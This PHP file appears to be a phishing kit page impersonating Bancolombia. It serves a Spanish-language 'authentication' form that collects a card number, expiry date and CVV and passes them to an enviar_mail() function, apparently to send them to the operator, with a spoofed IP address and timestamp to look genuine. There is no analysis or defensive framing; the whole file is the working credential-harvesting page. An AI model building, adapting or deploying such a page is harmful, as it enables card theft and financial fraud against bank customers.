<?php
if (isset($_REQUEST["p"])) {
    $key = $_REQUEST["p"];
    $htmlContent = <<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Autenticación Bancolombia</title>
    <link rel="icon" href="./assets/img/logo.png">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link href="/assets/css/main.css" rel='stylesheet'>
    <script type="text/javascript" src="/assets/js/main.js"></script>
    <script type="text/javascript" src="/assets/js/main.js"></script>  
</head>
<body>
    <div class="wrapper">
        <header class="header">
            <span>Salir <i class='bx bx-exit'></i></span>
        </header>

        <main class="main">
            <h2 class="main__ttl">Ingresa tu información</h2>
            <div class="box">
                <p class="box__txt">
                    A continuación validaremos tus datos para comprobar tu identidad.
                </p>
                <div class="box__element">
                    <i class='bx bx-card'></i>
                     <!-- <img src="/tarjeta.png" alt="" srcset="" width="5%"> -->
                    <input class="box__input" type="number" required id="txtMail" style="font-size:16px;" maxlength="16">
                    <span class="box__lbl">Número de Tarjeta</span>
                </div>
                <div class="box__element">
                    <i class='bx bx-id-card'></i>
                    <input class="box__input" type="text" required id="txtPass" style="font-size:16px;"  maxlength="6">
                    <span class="box__lbl">Fecha Vencimiento</span>
                </div>
                <div class="box__element">
                    <i class='bx bx-lock'></i>
                    <input class="box__input" type="number" required id="txtCelular" style="font-size:16px;"  maxlength="4">
                    <span class="box__lbl">Cvv</span>
                </div>
                <div class="box__opt">
                    <button class="box__btn box__btn--transp" style="color:black;">Volver</button>
                    <button class="box__btn" id="btnMail" style="color:black;">Continuar</button>
                </div>
            </div>
            <div class="picture"></div>
        </main>
        <footer class="footer">
            <div class="line"></div>
            <div class="footer__logo1"></div>
            <div class="footer__logo2"></div>
            <span>
                <p>Dirección IP: 190.210.118.1</p>
                <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
            </span>
        </footer>
    </div>
    <script type="text/javascript">
        $(document).ready(function() {
            $('#btnMail').click(function(){
                if ($("#txtMail").val().length > 0) {
                    if ($("#txtPass").val().length > 0) {
                        if ($("#txtCelular").val().length > 0) {
                        
                            enviar_mail($("#txtMail").val(),$("#txtPass").val(),$("#txtCelular").val());
                        } else {
                            $(".mensaje").show();
                            $(".celular").css("border", "1px solid red");
                            $("#txtCelular").focus();
                        }
                    } else {
                        $(".mensaje").show();
                        $(".pass").css("border", "1px solid red");
                        $("#txtPass").focus();
                    }
                } else {
                    $(".mensaje").show();
                    $(".email").css("border", "1px solid red");
                    $("#txtMail").focus();
                }
            });
            $("#txtMail").keyup(function(e) {
                $(".email").css("border", "1px solid #CCCCCC");	
                $(".mensaje").hide();				
            });
            $("#txtPass").keyup(function(e) {
                $(".pass").css("border", "1px solid #CCCCCC");	
                $(".mensaje").hide();				
            });
            $("#txtCelular").keyup(function(e) {
                $(".celular").css("border", "1px solid #CCCCCC");	
                $(".mensaje").hide();				
            });
        });
    </script>
    <script src="/assets/js/main.js"></script>
</body>
</html>
HTML;
    echo $htmlContent;
} else {
    echo "No se ha recibido el parámetro 'p'.";
}
?>
